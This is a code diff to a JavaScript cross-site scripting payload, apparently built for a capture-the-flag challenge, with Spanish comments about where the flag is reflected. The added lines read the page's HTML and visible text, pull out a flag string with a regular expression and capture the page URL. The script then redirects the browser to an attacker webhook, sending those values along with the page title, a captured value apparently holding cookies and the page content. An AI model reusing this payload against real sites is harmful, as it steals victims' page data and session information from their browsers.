@@ -31,9 +31,22 @@
     c = String(e);
   }
   var h = "";
+  var full = "";
+  var f = "";
   try {
-    h = document.documentElement ? document.documentElement.outerHTML : "";
-    /* CurePoint flag suele ir tras el reflejo XSS (bloque resultados / footer). */
+    full = document.documentElement ? document.documentElement.outerHTML : "";
+    var txt = "";
+    try {
+      txt = document.body ? document.body.innerText || "" : "";
+    } catch (e1) {}
+    var hay = full + "\n" + txt;
+    var fm = hay.match(
+      /(?:flag|HCRD|HACKCON|hackcon|HackConRD)\{[^}\s]{0,200}\}/i
+    );
+    if (fm) f = fm[0];
+
+    h = full;
+    /* CurePoint: ventana alrededor del reflejo; si no, cola del documento. */
     var needle = "Showing results for:";
     var i = h.indexOf(needle);
     if (i >= 0) {
@@ -46,12 +59,20 @@
   } catch (e) {
     h = btoa(String(e));
   }
+  var loc = "";
+  try {
+    loc = String(window.location.href || "");
+  } catch (e2) {}
   window.location =
     WH +
     "?ping=1&c=" +
     encodeURIComponent(c) +
     "&t=" +
     encodeURIComponent(document.title || "") +
+    "&f=" +
+    encodeURIComponent(f) +
+    "&u=" +
+    encodeURIComponent(loc) +
     "&d=" +
     encodeURIComponent(h);
 })();
